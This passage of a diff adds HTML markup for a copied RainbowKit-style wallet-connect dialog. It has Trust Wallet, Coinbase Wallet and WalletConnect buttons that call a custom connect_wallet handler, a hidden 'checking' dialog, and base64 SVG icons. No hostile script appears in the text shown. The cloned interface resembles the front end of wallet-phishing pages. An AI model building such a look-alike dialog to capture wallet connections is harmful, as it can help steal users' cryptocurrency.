url(&quot;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHdpZHRoPSIyOCIgaGVpZ2h0PSIyOCIgdmlld0JveD0iMCAwIDI4IDI4Ij48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDI4djI4SDB6Ii8+PHBhdGggZmlsbD0iIzA1MDBGRiIgZD0iTTYgNy41ODMgMTMuNTMgNXYxNy44ODJDOC4xNSAyMC40OTggNiAxNS45MjggNiAxMy4zNDVWNy41ODNaIi8+PHBhdGggZmlsbD0idXJsKCNhKSIgZD0iTTIyIDcuNTgzIDEzLjUzIDV2MTcuODgyYzYuMDUtMi4zODQgOC40Ny02Ljk1NCA4LjQ3LTkuNTM3VjcuNTgzWiIvPjxkZWZzPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjE5Ljc2OCIgeDI9IjE0LjA3MiIgeTE9IjMuNzUzIiB5Mj0iMjIuODUzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIuMDIiIHN0b3AtY29sb3I9IiMwMEYiLz48c3RvcCBvZmZzZXQ9Ii4wOCIgc3RvcC1jb2xvcj0iIzAwOTRGRiIvPjxzdG9wIG9mZnNldD0iLjE2IiBzdG9wLWNvbG9yPSIjNDhGRjkxIi8+PHN0b3Agb2Zmc2V0PSIuNDIiIHN0b3AtY29sb3I9IiMwMDk0RkYiLz48c3RvcCBvZmZzZXQ9Ii42OCIgc3RvcC1jb2xvcj0iIzAwMzhGRiIvPjxzdG9wIG9mZnNldD0iLjkiIHN0b3AtY29sb3I9IiMwNTAwRkYiLz48L2xpbmVhckdyYWRpZW50PjwvZGVmcz48L3N2Zz4K&quot;); background-repeat: no-repeat; opacity: 1;"></div><div class="iekbcc0 ju367vc5 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9e"></div></div><div class="iekbcc0"><div class="iekbcc0">Trust Wallet</div></div></div></div></button></div>
+
+
+
+<div class="iekbcc0 ju367va ju367v15">
+                                            <button onclick="connect_wallet('Coinbase')" class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8t ju367v9e ju367vb0 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-coinbase" style="will-change: transform;">
+                                                <div class="iekbcc0 ju367vgt ju367v16 ju367v1a ju367v1h ju367v8t">
+                                                    <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+                                                        <div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v93" role="img" style="background: rgb(44, 95, 246);">
+                                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                                    transition: opacity 0.15s linear 0s;
+                                                                    user-select: none;
+                                                                    background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4IiBmaWxsPSIjMkM1RkY2Ii8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTQgMjMuOEMxOS40MTI0IDIzLjggMjMuOCAxOS40MTI0IDIzLjggMTRDMjMuOCA4LjU4NzYxIDE5LjQxMjQgNC4yIDE0IDQuMkM4LjU4NzYxIDQuMiA0LjIgOC41ODc2MSA0LjIgMTRDNC4yIDE5LjQxMjQgOC41ODc2MSAyMy44IDE0IDIzLjhaTTExLjU1IDEwLjhDMTEuMTM1OCAxMC44IDEwLjggMTEuMTM1OCAxMC44IDExLjU1VjE2LjQ1QzEwLjggMTYuODY0MiAxMS4xMzU4IDE3LjIgMTEuNTUgMTcuMkgxNi40NUMxNi44NjQyIDE3LjIgMTcuMiAxNi44NjQyIDE3LjIgMTYuNDVWMTEuNTVDMTcuMiAxMS4xMzU4IDE2Ljg2NDIgMTAuOCAxNi40NSAxMC44SDExLjU1WiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==');
+                                                                    background-repeat: no-repeat;
+                                                                    opacity: 1;
+                                                                "></div>
+                                                            <div class="iekbcc0 ju367vc5 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9e"></div>
+                                                        </div>
+                                                        <div class="iekbcc0"><div class="iekbcc0">Coinbase Wallet</div></div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                        </div><div class="iekbcc0 ju367va ju367v15">
+                                            <button onclick="connect_wallet('WalletConnect')" class="iekbcc0 iekbcc9 ju367v89 ju367v6i ju367v73 ju367v7o ju367vo ju367vt ju367vv ju367v8t ju367v9e ju367vb0 g5kl0l0 _12cbo8i3 ju367v8r _12cbo8i6" data-testid="rk-wallet-option-walletConnect" style="will-change: transform;">
+                                                <div class="iekbcc0 ju367vgt ju367v16 ju367v1a ju367v1h ju367v8t">
+                                                    <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1s">
+                                                        <div class="iekbcc0 ju367vj ju367v2b ju367v6c ju367v8r ju367v93" role="img" style="background: rgb(59, 153, 252);">
+                                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                                    transition: opacity 0.15s linear 0s;
+                                                                    user-select: none;
+                                                                    background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4IiBmaWxsPSIjM0I5OUZDIi8+CjxwYXRoIGQ9Ik04LjM4OTY5IDEwLjM3MzlDMTEuNDg4MiA3LjI3NTM4IDE2LjUxMTggNy4yNzUzOCAxOS42MTAzIDEwLjM3MzlMMTkuOTgzMiAxMC43NDY4QzIwLjEzODIgMTAuOTAxNyAyMC4xMzgyIDExLjE1MjkgMTkuOTgzMiAxMS4zMDc4TDE4LjcwNzYgMTIuNTgzNUMxOC42MzAxIDEyLjY2MDkgMTguNTA0NSAxMi42NjA5IDE4LjQyNzEgMTIuNTgzNUwxNy45MTM5IDEyLjA3MDNDMTUuNzUyMyA5LjkwODcgMTIuMjQ3NyA5LjkwODcgMTAuMDg2MSAxMi4wNzAzTDkuNTM2NTUgMTIuNjE5OEM5LjQ1OTA5IDEyLjY5NzMgOS4zMzM1IDEyLjY5NzMgOS4yNTYwNCAxMi42MTk4TDcuOTgwMzkgMTEuMzQ0MkM3LjgyNTQ3IDExLjE4OTMgNy44MjU0NyAxMC45MzgxIDcuOTgwMzkgMTAuNzgzMkw4LjM4OTY5IDEwLjM3MzlaTTIyLjI0ODUgMTMuMDEyTDIzLjM4MzggMTQuMTQ3NEMyMy41Mzg3IDE0LjMwMjMgMjMuNTM4NyAxNC41NTM1IDIzLjM4MzggMTQuNzA4NEwxOC4yNjQ1IDE5LjgyNzdDMTguMTA5NiAxOS45ODI3IDE3Ljg1ODQgMTkuOTgyNyAxNy43MDM1IDE5LjgyNzdDMTcuNzAzNSAxOS44Mjc3IDE3LjcwMzUgMTkuODI3NyAxNy43MDM1IDE5LjgyNzdMMTQuMDcwMiAxNi4xOTQ0QzE0LjAzMTQgMTYuMTU1NyAxMy45Njg2IDE2LjE1NTcgMTMuOTI5OSAxNi4xOTQ0QzEzLjkyOTkgMTYuMTk0NCAxMy45Mjk5IDE2LjE5NDQgMTMuOTI5OSAxNi4xOTQ0TDEwLjI5NjYgMTkuODI3N0MxMC4xNDE3IDE5Ljk4MjcgOS44OTA1MyAxOS45ODI3IDkuNzM1NjEgMTkuODI3OEM5LjczNTYgMTkuODI3OCA5LjczNTYgMTkuODI3NyA5LjczNTYgMTkuODI3N0w0LjYxNjE5IDE0LjcwODNDNC40NjEyNyAxNC41NTM0IDQuNDYxMjcgMTQuMzAyMiA0LjYxNjE5IDE0LjE0NzNMNS43NTE1MiAxMy4wMTJDNS45MDY0NSAxMi44NTcgNi4xNTc2MyAxMi44NTcgNi4zMTI1NSAxMy4wMTJMOS45NDU5NSAxNi42NDU0QzkuOTg0NjggMTYuNjg0MSAxMC4wNDc1IDE2LjY4NDEgMTAuMDg2MiAxNi42NDU0QzEwLjA4NjIgMTYuNjQ1NCAxMC4wODYyIDE2LjY0NTQgMTAuMDg2MiAxNi42NDU0TDEzLjcxOTQgMTMuMDEyQzEzLjg3NDMgMTIuODU3IDE0LjEyNTUgMTIuODU3IDE0LjI4MDUgMTMuMDEyQzE0LjI4MDUgMTMuMDEyIDE0LjI4MDUgMTMuMDEyIDE0LjI4MDUgMTMuMDEyTDE3LjkxMzkgMTYuNjQ1NEMxNy45NTI2IDE2LjY4NDEgMTguMDE1NCAxNi42ODQxIDE4LjA1NDEgMTYuNjQ1NEwyMS42ODc0IDEzLjAxMkMyMS44NDI0IDEyLjg1NzEgMjIuMDkzNiAxMi44NTcxIDIyLjI0ODUgMTMuMDEyWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==');
+                                                                    background-repeat: no-repeat;
+                                                                    opacity: 1;
+                                                                "></div>
+                                                            <div class="iekbcc0 ju367vc5 ju367vj ju367vt ju367vv ju367v2m ju367v8r ju367v9e"></div>
+                                                        </div>
+                                                        <div class="iekbcc0"><div class="iekbcc0">WalletConnect</div></div>
+                                                    </div>
+                                                </div>
+                                            </button>
+                                        </div>
+                                        
+                                        
+                                    </div>
+                                </div>
+                                <div class="iekbcc0 ju367vat ju367v24 ju367v57"></div>
+                                <div class="iekbcc0 ju367v7c ju367v7x ju367v8f ju367v6o ju367v4 ju367va ju367v2r">
+                                    <div class="iekbcc0 ju367v88 ju367v6h"><div class="iekbcc0 ju367vgz ju367v16 ju367v19 ju367v1f ju367v2v">New to Ethereum wallets?</div></div>
+                                    <div class="iekbcc0 ju367v4 ju367va ju367v14 ju367v1n ju367v2q">
+                                        <div class="iekbcc0 ju367v88 ju367v6h ju367vy ju367v8t _12cbo8i3 ju367v8r _12cbo8i4 _12cbo8i6" style="will-change: transform;">
+                                            <div class="iekbcc0 ju367vez ju367v16 ju367v19 ju367v1h ju367v2v">Learn More</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div tabindex="0"></div>
+    </div>
+</div>
+   <div class="iekbcc0" data-rk="" id="checking" style="display: none;">
+    <div id="checking-close" class="iekbcc0 ju367v4 ju367v8q _9pm4ki3 ju367v9g ju367vb2 ju367va ju367v2q ju367v8q" data-rk="" aria-labelledby="rk_connect_title" aria-modal="true" role="dialog">
+        <div tabindex="0"></div>
+        <div tabindex="-1" class="_9pm4ki5 ju367va ju367v15 ju367v8r" role="document" style="outline: none;">
+            <div class="iekbcc0">
+                <div class="iekbcc0 _1ckjpok4 _1ckjpok1 ju367vb5 ju367vdq ju367vp ju367vt ju367vv ju367vek ju367va ju367v15 ju367v6c ju367v8r">
+                    <div class="iekbcc0 ju367v84 ju367v6d ju367v6y ju367v7j">
+                        <div class="iekbcc0 ju367va ju367v14" style="max-height: 468px;">
+                            <div class="iekbcc0 ju367v4y ju367v37 ju367v3s ju367v4d ju367va ju367v15" style="flex-grow: 1;">
+                                <div class="iekbcc0 ju367v4 ju367va ju367v2r ju367v35">
+                                    <div class="iekbcc0 ju367v93">
+                                        <button class="iekbcc0 iekbcc9 ju367v75 ju367v7q ju367v88 ju367v6h ju367vez ju367v8t _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" type="button" style="box-sizing: content-box; height: 17px; will-change: transform;">
+                                            <svg fill="none" height="17" viewbox="0 0 11 17" width="11" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M0.99707 8.6543C0.99707 9.08496 1.15527 9.44531 1.51562 9.79688L8.16016 16.3096C8.43262 16.5732 8.74902 16.7051 9.13574 16.7051C9.90918 16.7051 10.5508 16.0811 10.5508 15.3076C10.5508 14.9121 10.3838 14.5605 10.0938 14.2705L4.30176 8.64551L10.0938 3.0293C10.3838 2.74805 10.5508 2.3877 10.5508 2.00098C10.5508 1.23633 9.90918 0.603516 9.13574 0.603516C8.74902 0.603516 8.43262 0.735352 8.16016 0.999023L1.51562 7.51172C1.15527 7.85449 1.00586 8.21484 0.99707 8.6543Z" fill="currentColor"></path>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                    <div class="iekbcc0 ju367va ju367v2q" style="flex-grow: 1;"></div>
+                                    <button class="iekbcc0 iekbcc9 ju367v4 ju367v9z ju367vc5 ju367vs ju367vt ju367vv ju367vfe ju367va ju367v2b ju367v2q ju367v8t ju367v93 _12cbo8i3 ju367v8r _12cbo8i5 _12cbo8i7" aria-label="Close" type="button" style="will-change: transform;">
+                                        <svg aria-hidden="true" fill="none" height="10" viewbox="0 0 10 10" width="10" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M1.70711 0.292893C1.31658 -0.0976311 0.683417 -0.0976311 0.292893 0.292893C-0.0976311 0.683417 -0.0976311 1.31658 0.292893 1.70711L3.58579 5L0.292893 8.29289C-0.0976311 8.68342 -0.0976311 9.31658 0.292893 9.70711C0.683417 10.0976 1.31658 10.0976 1.70711 9.70711L5 6.41421L8.29289 9.70711C8.68342 10.0976 9.31658 10.0976 9.70711 9.70711C10.0976 9.31658 10.0976 8.68342 9.70711 8.29289L6.41421 5L9.70711 1.70711C10.0976 1.31658 10.0976 0.683417 9.70711 0.292893C9.31658 -0.0976311 8.68342 -0.0976311 8.29289 0.292893L5 3.58579L1.70711 0.292893Z" fill="currentColor"></path>
+                                        </svg>
+                                    </button>
+                                </div>
+                                <div class="iekbcc0 ju367va ju367v15" style="min-height: 396px;">
+                                    <div class="iekbcc0 ju367v3o ju367v49 ju367v4 ju367va ju367v15 ju367v1p ju367v2m ju367v2q">
+                                        <div class="iekbcc0 ju367va ju367v15 ju367v2m ju367v9e">
+                                            <div class="iekbcc0 ju367v4 ju367va ju367v2q" style="flex-grow: 1;">
+                                                <div class="iekbcc0 ju367v4 ju367va ju367v15 ju367v1q">
+                                                    <div class="iekbcc0 ju367vk ju367v2h ju367v6c">
+                                                        <div class="iekbcc0 ju367v2h ju367v6c ju367v8r ju367v99" role="img">
+                                                            <div class="iekbcc0 ju367vh ju367v2m ju367v8p ju367v9e" style="
+                                                                    transition: opacity 0.15s linear 0s;
+                                                                    user-select: none;
+                                                                    background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjQuMDg5MSAzLjExOTlMMTUuMzQ0NiA5LjYxNDU2TDE2Ljk2MTcgNS43ODI4TDI0LjA4OTEgMy4xMTk5WiIgZmlsbD0iI0UyNzYxQiIgc3Ryb2tlPSIjRTI3NjFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0zLjkwMjA3IDMuMTE5OUwxMi41NzYzIDkuNjc2MDhMMTEuMDM4MyA1Ljc4MjhMMy45MDIwNyAzLjExOTlaIiBmaWxsPSIjRTQ3NjFCIiBzdHJva2U9IiNFNDc2MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTIwLjk0MjkgMTguMTc0NUwxOC42MTM5IDIxLjc0MjZMMjMuNTk3IDIzLjExMzZMMjUuMDI5NSAxOC4yNTM2TDIwLjk0MjkgMTguMTc0NVoiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMi45NzkyOSAxOC4yNTM2TDQuNDAzMDEgMjMuMTEzNkw5LjM4NjA3IDIxLjc0MjZMNy4wNTcxMyAxOC4xNzQ1TDIuOTc5MjkgMTguMjUzNloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4xMDQ4MyAxMi4xNDU2TDcuNzE2MjYgMTQuMjQ2MUwxMi42NjQyIDE0LjQ2NThMMTIuNDg4NCA5LjE0ODc3TDkuMTA0ODMgMTIuMTQ1NloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTguODg2NCAxMi4xNDU2TDE1LjQ1ODkgOS4wODcyNUwxNS4zNDQ2IDE0LjQ2NThMMjAuMjgzNyAxNC4yNDYxTDE4Ljg4NjQgMTIuMTQ1NloiIGZpbGw9IiNFNDc2MUIiIHN0cm9rZT0iI0U0NzYxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4zODYwNiAyMS43NDI2TDEyLjM1NjYgMjAuMjkyNUw5Ljc5MDMzIDE4LjI4ODhMOS4zODYwNiAyMS43NDI2WiIgZmlsbD0iI0U0NzYxQiIgc3Ryb2tlPSIjRTQ3NjFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xNS42MzQ3IDIwLjI5MjVMMTguNjEzOSAyMS43NDI2TDE4LjIwMDkgMTguMjg4OEwxNS42MzQ3IDIwLjI5MjVaIiBmaWxsPSIjRTQ3NjFCIiBzdHJva2U9IiNFNDc2MUIiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE4LjYxMzkgMjEuNzQyNkwxNS42MzQ3IDIwLjI5MjVMMTUuODcxOSAyMi4yMzQ4TDE1Ljg0NTYgMjMuMDUyMUwxOC42MTM5IDIxLjc0MjZaIiBmaWxsPSIjRDdDMUIzIiBzdHJva2U9IiNEN0MxQjMiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTkuMzg2MDYgMjEuNzQyNkwxMi4xNTQ0IDIzLjA1MjFMMTIuMTM2OCAyMi4yMzQ4TDEyLjM1NjYgMjAuMjkyNUw5LjM4NjA2IDIxLjc0MjZaIiBmaWxsPSIjRDdDMUIzIiBzdHJva2U9IiNEN0MxQjMiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTEyLjE5ODQgMTcuMDA1Nkw5LjcyMDAyIDE2LjI3NjJMMTEuNDY4OSAxNS40NzY1TDEyLjE5ODQgMTcuMDA1NloiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuNzkyOCAxNy4wMDU2TDE2LjUyMjMgMTUuNDc2NUwxOC4yOCAxNi4yNzYyTDE1Ljc5MjggMTcuMDA1NloiIGZpbGw9IiMyMzM0NDciIHN0cm9rZT0iIzIzMzQ0NyIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNOS4zODYwNiAyMS43NDI2TDkuODA3OTEgMTguMTc0NUw3LjA1NzEyIDE4LjI1MzZMOS4zODYwNiAyMS43NDI2WiIgZmlsbD0iI0NENjExNiIgc3Ryb2tlPSIjQ0Q2MTE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xOC4xOTIxIDE4LjE3NDVMMTguNjEzOSAyMS43NDI2TDIwLjk0MjkgMTguMjUzNkwxOC4xOTIxIDE4LjE3NDVaIiBmaWxsPSIjQ0Q2MTE2IiBzdHJva2U9IiNDRDYxMTYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTIwLjI4MzcgMTQuMjQ2MUwxNS4zNDQ2IDE0LjQ2NThMMTUuODAxNiAxNy4wMDU3TDE2LjUzMTEgMTUuNDc2NUwxOC4yODg4IDE2LjI3NjJMMjAuMjgzNyAxNC4yNDYxWiIgZmlsbD0iI0NENjExNiIgc3Ryb2tlPSIjQ0Q2MTE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik05LjcyMDAyIDE2LjI3NjJMMTEuNDc3NyAxNS40NzY1TDEyLjE5ODQgMTcuMDA1N0wxMi42NjQyIDE0LjQ2NThMNy43MTYyNiAxNC4yNDYxTDkuNzIwMDIgMTYuMjc2MloiIGZpbGw9IiNDRDYxMTYiIHN0cm9rZT0iI0NENjExNiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNNy43MTYyNiAxNC4yNDYxTDkuNzkwMzMgMTguMjg4OEw5LjcyMDAyIDE2LjI3NjJMNy43MTYyNiAxNC4yNDYxWiIgZmlsbD0iI0U0NzUxRiIgc3Ryb2tlPSIjRTQ3NTFGIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0xOC4yODg4IDE2LjI3NjJMMTguMjAwOSAxOC4yODg4TDIwLjI4MzcgMTQuMjQ2MUwxOC4yODg4IDE2LjI3NjJaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTEyLjY2NDIgMTQuNDY1OEwxMi4xOTg0IDE3LjAwNTdMMTIuNzc4NCAyMC4wMDI1TDEyLjkxMDIgMTYuMDU2NUwxMi42NjQyIDE0LjQ2NThaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE1LjM0NDYgMTQuNDY1OEwxNS4xMDczIDE2LjA0NzdMMTUuMjEyOCAyMC4wMDI1TDE1LjgwMTYgMTcuMDA1N0wxNS4zNDQ2IDE0LjQ2NThaIiBmaWxsPSIjRTQ3NTFGIiBzdHJva2U9IiNFNDc1MUYiIHN0cm9rZS13aWR0aD0iMC4wODc4ODQ1IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4KPHBhdGggZD0iTTE1LjgwMTYgMTcuMDA1NkwxNS4yMTI4IDIwLjAwMjVMMTUuNjM0NyAyMC4yOTI1TDE4LjIwMDkgMTguMjg4OEwxOC4yODg4IDE2LjI3NjJMMTUuODAxNiAxNy4wMDU2WiIgZmlsbD0iI0Y2ODUxQiIgc3Ryb2tlPSIjRjY4NTFCIiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik05LjcyMDAyIDE2LjI3NjJMOS43OTAzMyAxOC4yODg4TDEyLjM1NjYgMjAuMjkyNUwxMi43Nzg0IDIwLjAwMjVMMTIuMTk4NCAxNy4wMDU2TDkuNzIwMDIgMTYuMjc2MloiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuODQ1NiAyMy4wNTIxTDE1Ljg3MTkgMjIuMjM0OEwxNS42NTIyIDIyLjA0MTRIMTIuMzM5TDEyLjEzNjggMjIuMjM0OEwxMi4xNTQ0IDIzLjA1MjFMOS4zODYwNiAyMS43NDI2TDEwLjM1MjggMjIuNTMzNkwxMi4zMTI2IDIzLjg5NThIMTUuNjc4NkwxNy42NDcyIDIyLjUzMzZMMTguNjEzOSAyMS43NDI2TDE1Ljg0NTYgMjMuMDUyMVoiIGZpbGw9IiNDMEFEOUUiIHN0cm9rZT0iI0MwQUQ5RSIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTUuNjM0NyAyMC4yOTI1TDE1LjIxMjggMjAuMDAyNUgxMi43Nzg0TDEyLjM1NjYgMjAuMjkyNUwxMi4xMzY4IDIyLjIzNDhMMTIuMzM5IDIyLjA0MTRIMTUuNjUyMkwxNS44NzE5IDIyLjIzNDhMMTUuNjM0NyAyMC4yOTI1WiIgZmlsbD0iIzE2MTYxNiIgc3Ryb2tlPSIjMTYxNjE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0yNC40NTgzIDEwLjAzNjRMMjUuMjA1MyA2LjQ1MDcyTDI0LjA4OTEgMy4xMTk5TDE1LjYzNDcgOS4zOTQ4NUwxOC44ODY0IDEyLjE0NTZMMjMuNDgyNyAxMy40OTAzTDI0LjUwMjIgMTIuMzAzOEwyNC4wNjI4IDExLjk4NzRMMjQuNzY1OCAxMS4zNDU5TDI0LjIyMSAxMC45MjRMMjQuOTI0IDEwLjM4NzlMMjQuNDU4MyAxMC4wMzY0WiIgZmlsbD0iIzc2M0QxNiIgc3Ryb2tlPSIjNzYzRDE2IiBzdHJva2Utd2lkdGg9IjAuMDg3ODg0NSIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+CjxwYXRoIGQ9Ik0yLjc5NDcyIDYuNDUwNzJMMy41NDE3NCAxMC4wMzY0TDMuMDY3MTcgMTAuMzg3OUwzLjc3MDI0IDEwLjkyNEwzLjIzNDE1IDExLjM0NTlMMy45MzcyMiAxMS45ODc0TDMuNDk3OCAxMi4zMDM4TDQuNTA4NDcgMTMuNDkwM0w5LjEwNDgzIDEyLjE0NTZMMTIuMzU2NiA5LjM5NDg1TDMuOTAyMDcgMy4xMTk5TDIuNzk0NzIgNi40NTA3MloiIGZpbGw9IiM3NjNEMTYiIHN0cm9rZT0iIzc2M0QxNiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMjMuNDgyNyAxMy40OTAzTDE4Ljg4NjQgMTIuMTQ1NkwyMC4yODM3IDE0LjI0NjFMMTguMjAwOSAxOC4yODg4TDIwLjk0MjkgMTguMjUzNkgyNS4wMjk1TDIzLjQ4MjcgMTMuNDkwM1oiIGZpbGw9IiNGNjg1MUIiIHN0cm9rZT0iI0Y2ODUxQiIgc3Ryb2tlLXdpZHRoPSIwLjA4Nzg4NDUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3Vu